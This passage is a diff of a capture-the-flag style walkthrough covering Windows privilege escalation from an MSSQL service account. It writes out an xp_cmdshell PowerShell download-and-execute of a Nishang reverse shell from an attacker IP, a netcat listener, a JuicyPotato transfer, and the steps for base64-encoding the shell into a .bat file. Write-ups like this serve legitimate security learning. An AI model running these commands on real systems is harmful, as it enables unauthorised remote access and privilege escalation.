@@ -165,6 +165,21 @@ From here I can get the user flag by changing `whoami` to `cat c:\users\miscsvc\
 
 Privilege Escalation
 --------------------
-Now I'll get a shell on the box as `sqlsvc` so that I can use `SeImpersonatePrivilege`
+Now I'll get a shell on the box as `sqlsvc` so that I can ~~exploit~~ use `SeImpersonatePrivilege`
 
 To do this I'll run `rlwrap nc -nvlp 8000` to start a netcat listener on port 8000, while hosting Nishang's `Invoke-PowerShellTcp.ps1` reverse shell on a webserver then execute `xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.43/Invoke-PowerShellTcp.ps1')` from the MSSQL instance. 
+
+<img src="Images/shell.png" width=500>
+
+then I'll `cd` into my home directory `C:\Users\sqlsvc` which I have write permissions over. Next I'll download JuicyPotato.exe from github and transfer it into my home directory on the target, saving it as jp.exe.
+
+<img src="Images/jp.png" width=500>
+
+Now I'll create a `.bat` file containing the base64 encoded nishang reverse shell by running the commands
+```
+└─PS> $Data = get-content ./Invoke-PowerShellTcp.ps1 
+└─PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data)
+└─PS> $EncodedData = [Convert]::ToBase64String($Bytes)                                        
+└─PS> $EncodedData | Out-File shell.bat                                                                                                                   
+```
+in the linux powershell console, and prepending `powershell -EncodedCommand ` to `shell.bat`. A `.bat` file will be executed immediately upon opening.
